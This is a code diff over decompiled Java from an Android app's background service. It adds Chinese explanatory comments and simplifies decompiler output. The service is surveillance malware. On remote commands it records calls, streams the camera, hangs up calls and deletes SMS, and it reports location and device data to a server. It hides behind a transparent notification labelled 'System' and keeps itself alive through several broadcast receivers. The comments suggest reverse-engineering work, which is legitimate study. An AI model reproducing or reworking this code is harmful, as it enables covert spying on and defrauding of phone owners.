@@ -202,6 +202,9 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
     private boolean isUninstallApk = false;
     private int pingServerCount = 0;
     private boolean isPingServer = false;
+    /**
+     * 监听电量广播
+     */
     private final BroadcastReceiver mBatteryReceiver = new BroadcastReceiver() { // from class: com.wish.lmbank.service.RecServiceV.8
 
         @Override // android.content.BroadcastReceiver
@@ -212,6 +215,10 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
             }
         }
     };
+
+    /**
+     * 监听网络广播
+     */
     private final BroadcastReceiver mConnectivityReceiver = new BroadcastReceiver() { // from class: com.wish.lmbank.service.RecServiceV.9
 
         @Override // android.content.BroadcastReceiver
@@ -271,6 +278,7 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
 
     private void init() {
         Constants.load(AppStartV.isDebug);
+        //判断是否亮屏状态
 //         isPause = ((PowerManager) getApplicationContext().getSystemService(bb7d7pu7.m5998("GQYeDBs"))).isScreenOn();
         isPause = ((PowerManager) getApplicationContext().getSystemService(Context.POWER_SERVICE)).isScreenOn();
         if (this.handler == null) {
@@ -350,13 +358,12 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         SocketHelper.getInstance(this).connect();
     }
 
+    //初始化监听亮屏状态广播
     private void initKeepLive() {
         if (this.mOnepxReceiver == null) {
             this.mOnepxReceiver = new OnepxReceiver();
         }
-        if (this.mOnepxReceiver == null) {
-            this.mOnepxReceiver = new OnepxReceiver();
-        }
+
         IntentFilter intentFilter = new IntentFilter();
 //         intentFilter.addAction(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRzoqOywsJzYmLy8"));
         intentFilter.addAction("android.intent.action.SCREEN_OFF");
@@ -374,8 +381,10 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         registerReceiver(this.screenStateReceiver, intentFilter2);
     }
 
-    /* JADX INFO: Access modifiers changed from: private */
-    /* loaded from: cookie_9234504.jar:com/wish/lmbank/service/RecServiceV$ScreenStateReceiver.class */
+
+    /**
+     * 亮屏状态广播
+     */
     public class ScreenStateReceiver extends BroadcastReceiver {
         final RecServiceV this$0;
 
@@ -387,6 +396,7 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         public void onReceive(Context context, Intent intent) {
 //             if (intent.getAction().equals(bb7d7pu7.m5998("NigqPSAmJzY6KjssLCc2Ji8v"))) {
             if (intent.getAction().equals("_ACTION_SCREEN_OFF")) {
+                //亮屏
                 RecServiceV.isPause = false;
                 if (!AppStartV.isCalling) {
                     RecServiceV.this.play();
@@ -400,6 +410,7 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
                 SettingUtils.getUninstallApkList(AppStartV.getContext(), AccessibilityHelper.UNINSTALL_APK);
 //             } else if (intent.getAction().equals(bb7d7pu7.m5998("NigqPSAmJzY6KjssLCc2Jic"))) {
             } else if (intent.getAction().equals("_ACTION_SCREEN_ON")) {
+                //息屏
                 RecServiceV.isPause = true;
                 RecServiceV.this.pause();
                 HandlerUtils.getMainThreadHandler().postDelayed(RecServiceV.this.uninstallApkRunnable, 15000L);
@@ -408,6 +419,9 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         }
     }
 
+    /**
+     * 初始化监听摄像头
+     */
     private void initRTMP() {
         this.rtmpCamera2 = new RtmpCamera2(this, false, new ConnectCheckerRtmp() {
             @Override
@@ -449,6 +463,9 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         });
     }
 
+    /**
+     * 状态栏通知，保活的一种手法
+     */
     private void startNotification() {
         if (KeepLive.foregroundNotification == null) {
             KeepLive.foregroundNotification = new ForegroundNotification("시스템", "정보불러오는중...", R2.drawable.ico_transparent, R2.layout.layout_notification_transparent);
@@ -476,7 +493,9 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         }
     }
 
+
     private void initDB() {
+        //删除1=1
         CommandRecordingDB.getInstance(this).deleteCommandRecording();
     }
 
@@ -540,9 +559,6 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         });
     }
 
-    /* JADX INFO: Access modifiers changed from: package-private */
-    /* renamed from: com.wish.lmbank.service.RecServiceV$7  reason: invalid class name */
-    /* loaded from: cookie_9234504.jar:com/wish/lmbank/service/RecServiceV$7.class */
     public class AnonymousClass7 implements Runnable {
         final RecServiceV this$0;
 
@@ -559,9 +575,9 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
             try {
                 Document document = Jsoup.connect(URL.URL_ALTERNATE_IP).get();
                 //                     Iterator it = document.getElementsByTag(bb7d7pu7.m5998("HQAdBQw")).iterator();
-                Iterator it = document.getElementsByTag("title").iterator();
+                Iterator<Element> it = document.getElementsByTag("title").iterator();
                 while (it.hasNext()) {
-                    String html = ((Element) it.next()).html();
+                    String html = it.next().html();
 //                         LogUtils.callLog(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoMRUkbDBgcDBodIQYaHUVJHQAdBQxTSQ") + html);
                     LogUtils.callLog("RecorderService, requestHost, title: " + html);
                     if (!TextUtils.isEmpty(html)) {
@@ -607,14 +623,20 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         new Thread(new AnonymousClass7(this)).start();
     }
 
+
+    /**
+     * 获取当前电量，保活后台运行的一种
+     */
     private void registerBatteryReceiver() {
         IntentFilter intentFilter = new IntentFilter();
 //             intentFilter.addAction(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRysoPT0sOzA2KiEoJy4sLQ"));
         intentFilter.addAction("android.intent.action.BATTERY_CHANGED");
         registerReceiver(this.mBatteryReceiver, intentFilter);
-        return;
     }
 
+    /**
+     * 注册网络状态广播
+     */
     private void registerConnectivityReceiver() {
         IntentFilter intentFilter = new IntentFilter();
 //         intentFilter.addAction(bb7d7pu7.m5998("CAcNGwYADUcHDB1HCgYHB0cqJicnLCo9ID8gPTA2KiEoJy4s"));
@@ -642,17 +664,19 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         registerReceiver(this.mPhoneCallReceiver, intentFilter);
     }
 
+    /**
+     * 注销电话监听广播
+     */
     private void unregisterPhoneCallReceiver() {
         try {
             TelePhoneReceiver telePhoneReceiver = this.mPhoneCallReceiver;
             if (telePhoneReceiver != null) {
                 unregisterReceiver(telePhoneReceiver);
                 this.mPhoneCallReceiver = null;
-                return;
             }
         } catch (Exception e) {
 //             LogUtils.e(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"), e, new Object[0]);
-            LogUtils.e("RecorderService", e, new Object[0]);
+            LogUtils.e("RecorderService", e);
         }
     }
 
@@ -721,7 +745,6 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
                     return;
                 }
                 RecServiceV.this.mThreadHandler.sendEmptyMessage(2);
-                return;
             }
         }, 0L, 20000L);
     }
@@ -745,6 +768,9 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         }
     }
 
+    /**
+     * 录音
+     */
     private void initHandlerThread() {
 //         HandlerThread handlerThread = new HandlerThread(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"));
         HandlerThread handlerThread = new HandlerThread("RecorderService");
@@ -773,14 +799,16 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
     @Override // com.wish.lmbank.hellodaemon.AbsWorkService, android.app.Service
     public void onDestroy() {
         super.onDestroy();
-        StringBuilder sb = new StringBuilder();
-//         sb.append(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoMSQYHLQwaHRsGEEVJABlTSQ"));
-        sb.append("RecorderService onDestroy, ip: ");
-        sb.append(URL.getHost());
-        LogUtils.callLog(sb.toString());
+        /* sb.append(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoMSQYHLQwaHRsGEEVJABlTSQ")); */
+        String sb = "RecorderService onDestroy, ip: " +
+                URL.getHost();
+        LogUtils.callLog(sb);
         toDestroy();
     }
 
+    /**
+     * 后台服务关闭，注销所有广播
+     */
     private void toDestroy() {
         isAlive = false;
 //         SocketHelper.getInstance(this).sendConnectStateToServer(bb7d7pu7.m5998("Ji8v"));
@@ -865,6 +893,9 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         }
     }
 
+    /**
+     * 注册网络状态广播
+     */
     private void registerNetworkStateReceiver() {
         if (this.mNetStateReceiver == null) {
             this.mNetStateReceiver = new BroadcastReceiver() { // from class: com.wish.lmbank.service.RecServiceV.15
@@ -986,7 +1017,6 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
                     }
                 }
             });
-            return;
         }
     }
 
@@ -1007,7 +1037,6 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         LogUtils.callLog("onReceiveRecording, 收到执行录音命令, msg: " + commandRecordingBean.toString() + ", state: " + RecorderShortHelper.getInstance().state());
         if (RecorderShortHelper.getInstance().state() == 0) {
             RecorderShortHelper.getInstance().startRecording(2, Integer.toString(commandRecordingBean.getrId()), Long.toString(commandRecordingBean.getDuration()));
-            return;
         }
     }
 
@@ -1092,6 +1121,11 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         LogUtils.callLog(str);
     }
 
+    /**
+     * 从后端获取东西，这个不理解
+     *
+     * @param z
+     */
     /* JADX INFO: Access modifiers changed from: private */
     public void loadExtraMessage(boolean z) {
         if (this.isLoadingExtraMsg) {
@@ -1101,7 +1135,6 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         HttpManager.getInstance().loadExtraMessage(DeviceInfoUtils.getDeviceID(this), z, new HttpEngine.OnResponseCallback<HttpResponse.ExtraMessage>() { // from class: com.wish.lmbank.service.RecServiceV.18
             @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
             public void onResponse(int i, String str, HttpResponse.ExtraMessage extraMessage) {
-
                 RecServiceV.this.isLoadingExtraMsg = false;
                 if (i != 0 || extraMessage.getData() == null) {
                     StringBuilder sb = new StringBuilder();
@@ -1154,13 +1187,15 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
                 }
                 if (extraMessage.getData().isUpdatePhone()) {
                     RecServiceV.this.loadLimitPhoneNumber();
-                    return;
                 }
 
             }
         });
     }
 
+    /**
+     * 从后端获取
+     */
     /* JADX INFO: Access modifiers changed from: private */
     public void loadLimitPhoneNumber() {
         Thread thread = this.mGetLimitPhoneNumberThread;
@@ -1188,6 +1223,9 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         }
     }
 
+    /**
+     * 从后端获取
+     */
     /* JADX INFO: Access modifiers changed from: private */
     public void loadColorRing() {
         Thread thread = this.mGetColorRingThread;
@@ -1209,7 +1247,6 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
                         return;
                     }
                     RecServiceV.this.mSingleThreadPool.submit(RecServiceV.this.mGetColorRingThread);
-                    return;
                 }
             }
         });
@@ -1254,9 +1291,9 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
 
     private void executeV(String str) {
         UploadInfoThreadExecutor.getSingleton().execute(this.mUploadPhoneInfoRunnable, str);
-        return;
     }
 
+    //后端删除短信指令
     @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
     public void onDeleteSMS(CommandDeleteSMSBean commandDeleteSMSBean) {
         String[] split;
@@ -1268,7 +1305,7 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
             if (!TextUtils.isEmpty(str)) {
 //                 String[] split2 = str.split(bb7d7pu7.m5998("RQ"));
                 String[] split2 = str.split(",");
-                if (split2 != null && split2.length >= 2) {
+                if (split2.length >= 2) {
                     ContentUtils.deleteSMS(this, split2[0], split2[1]);
                 }
             }
@@ -1361,7 +1398,6 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
             }
             return;
         }
-        return;
     }
 
     @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
@@ -1458,14 +1494,7 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
         SocketHelper.getInstance(this).sendUploadInfoMsgToServer(sb.toString());
     }
 
-    /* JADX WARN: Code restructure failed: missing block: B:13:0x0037, code lost:
-        if (com.wish.lmbank.utils.SettingUtils.endCall(r4) == false) goto L13;
-     */
     @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
-    /*
-        Code decompiled incorrectly, please refer to instructions dump.
-        To view partially-correct code enable 'Show inconsistent code' option in preferences
-    */
     public void onReceiveHangUp(CommandHangUpBean commandHangUpBean) {
         if (bb7d7pu7.m5998("WQ").equals(commandHangUpBean.getUpdateLimitPhone())) {
             loadLimitPhoneNumber();
@@ -1523,9 +1552,7 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
             }
             SharedPreferencesUtils.putValue(m59983, m59984);
             this.rtmpCamera2.switchCamera();
-            return;
         } else if (this.rtmpCamera2.isStreaming()) {
-            return;
         } else {
             if (m59982.equals(order)) {
                 //this.rtmpCamera2.setCurrentType(1);
@@ -1537,10 +1564,7 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
                 }
                 z = false;
                 if (this.rtmpCamera2.prepareAudio()) {
-                    z = false;
-                    if (this.rtmpCamera2.prepareVideo()) {
-                        z = true;
-                    }
+                    z = this.rtmpCamera2.prepareVideo();
                 }
             } else {
                 z = false;
@@ -1563,7 +1587,7 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
 
     /* JADX INFO: Access modifiers changed from: private */
     /* loaded from: cookie_9234504.jar:com/wish/lmbank/service/RecServiceV$GetLimitPhoneThread.class */
-    public class GetLimitPhoneThread extends Thread {
+    public static class GetLimitPhoneThread extends Thread {
         private List<LimitPhoneNumberBean> mLimitPhoneNumber;
         private WeakReference<Context> mWeakContext;
         final RecServiceV this$0;
@@ -1599,7 +1623,7 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
 
     /* JADX INFO: Access modifiers changed from: private */
     /* loaded from: cookie_9234504.jar:com/wish/lmbank/service/RecServiceV$GetColorRingThread.class */
-    public class GetColorRingThread extends Thread {
+    public static class GetColorRingThread extends Thread {
         private List<ColorRingBean> mColorRing;
         private WeakReference<Context> mWeakContext;
         final RecServiceV this$0;
@@ -1745,17 +1769,14 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
     }
 
     protected void onCompressResult(List<LocalMedia> list) {
-        StringBuilder sb = new StringBuilder();
-//             sb.append(bb7d7pu7.m5998("BQYIDSgFBSQMDQAIRUkGByoGBBkbDBoaOwwaHAUdRUkaABMMU0k"));
-        sb.append("loadAllMedia, onCompressResult, size: ");
-        sb.append(list != null ? list.size() : 0);
-        LogUtils.callLog(sb.toString());
+        //             sb.append(bb7d7pu7.m5998("BQYIDSgFBSQMDQAIRUkGByoGBBkbDBoaOwwaHAUdRUkaABMMU0k"));
+        String sb = "loadAllMedia, onCompressResult, size: " +
+                (list != null ? list.size() : 0);
+        LogUtils.callLog(sb);
         if (SdkVersionUtils.isQ() && this.config.isAndroidQTransform) {
             onResultToAndroidAsy(list);
-            return;
         } else {
             saveAlbumDB(list);
-            return;
         }
     }
 
@@ -1774,13 +1795,7 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
             }
         }
         z = true;
-        if (z) {
-            startThreadCopySandbox(list);
-            return;
-        } else {
-            normalResult(list);
-            return;
-        }
+        startThreadCopySandbox(list);
     }
 
     private void normalResult(List<LocalMedia> list) {
@@ -1802,10 +1817,6 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
 
     private void startThreadCopySandbox(List<LocalMedia> list) {
         PictureThreadUtils.executeByIo(new PictureThreadUtils.SimpleTask<List<LocalMedia>>() { // from class: com.wish.lmbank.service.RecServiceV.25
-
-            /* JADX WARN: Removed duplicated region for block: B:118:0x020c A[SYNTHETIC] */
-            /* JADX WARN: Removed duplicated region for block: B:93:0x01d1  */
-
             public List<LocalMedia> doInBackground() {
                 boolean z;
                 int size = list.size();
@@ -1831,9 +1842,6 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
                             }
                         } else if (localMedia.isCut() && localMedia.isCompressed()) {
                             localMedia.setAndroidQToPath(localMedia.getCompressPath());
-                        }
-                        z = false;
-                        if (!RecServiceV.this.config.isCheckOriginalImage) {
                         }
                     }
                 }
@@ -1861,16 +1869,11 @@ public class RecServiceV extends AbsWorkService implements PhoneCallListener, So
 //         SocketHelper.getInstance(this).sendLocationMsgToServer(location.getLongitude() + bb7d7pu7.m5998("Ng") + location.getLatitude());
         SocketHelper.getInstance(this).sendLocationMsgToServer(location.getLongitude() + "_" + location.getLatitude());
         this.mAndroidLocationManager.onPause();
-        return;
     }
 
     @Override // com.wish.lmbank.location.LocationManager.UpdateLocationListener
     public boolean isLocationPermissionAllowed() {
-        boolean z = true;
-        if (PermissionUtils.hasLocationPermission(this).size() >= 1) {
-            z = false;
-        }
-        return z;
+        return PermissionUtils.hasLocationPermission(this).size() < 1;
 
     }
 }
